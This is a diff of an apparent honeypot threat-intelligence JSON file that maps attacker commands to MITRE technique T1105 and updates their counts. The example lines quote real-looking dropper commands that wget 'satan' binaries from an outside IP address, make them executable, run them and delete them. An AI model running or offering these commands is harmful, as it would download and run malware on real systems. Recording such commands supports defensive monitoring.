@@ -41,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 1151,
-      "distinct_ips": 111,
+      "count": 1163,
+      "distinct_ips": 112,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./satan_mips; rm -rf satan_mips",
         "wget http://176.65.139.136/satan_x86_64; chmod 777 satan_x86_64; ./satan_x86_64; rm -rf satan_x86_64",
@@ -136,6 +136,6 @@
       ]
     }
   ],
-  "total_commands": 165975,
-  "matched_commands": 77193
+  "total_commands": 168631,
+  "matched_commands": 77205
 }
